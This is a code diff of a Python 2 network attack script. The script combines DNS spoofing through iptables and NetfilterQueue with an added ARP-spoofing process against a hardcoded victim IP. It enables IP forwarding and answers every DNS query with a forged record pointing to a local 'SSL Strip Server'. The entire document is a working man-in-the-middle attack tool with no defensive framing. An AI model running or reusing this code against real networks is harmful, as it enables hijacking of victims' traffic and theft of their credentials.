@@ -1,10 +1,18 @@
 import os
+import signal
+
+from cleaner import cleaner
+
+from arpspoof import ARP
+from multiprocessing import Process
+
 from netfilterqueue import NetfilterQueue
 
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
 
-localIP = '192.168.1.74'  # IP address for poisoned hosts.
+
+localIP = '192.168.1.74'  # SSL Strip Server Address
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
@@ -16,6 +24,8 @@ def callback(data):
     if not pkt.haslayer(DNSQR):
         data.accept()
     else:
+        host = pkt[DNS].qd.qname
+        print "Detect DNS query %s" % host
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(
@@ -24,24 +34,39 @@ def callback(data):
                           aa=1,
                           qd=pkt[DNS].qd,
                           an=DNSRR(
-                              rrname=pkt[DNS].qd.qname,
+                              rrname=host,
                               ttl=10,
                               rdata=localIP
                           )
                       )
+        print "Spoof %s to me!" % host
         data.set_payload(str(spoofed_pkt))
         data.accept()
+
+
+def run_arp(victim_ip):
+    arp = ARP(victim_ip)
+    arp.run()
 
 
 def main():
     q = NetfilterQueue()
     q.bind(1, callback)
+
+    signal.signal(signal.SIGTERM, cleaner)
+
+    victim_ip = '192.168.1.16'
+
+    arp_process = Process(target=run_arp, args=(victim_ip,))
+
     try:
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        arp_process.start()  # ARP Sub loop
         q.run()  # Main loop
     except KeyboardInterrupt:
         q.unbind()
-        os.system('iptables -F')
-        os.system('iptables -X')
+        arp_process.join()  # Escape ARP loop
+        cleaner()
 
 if __name__ == '__main__':
     main()
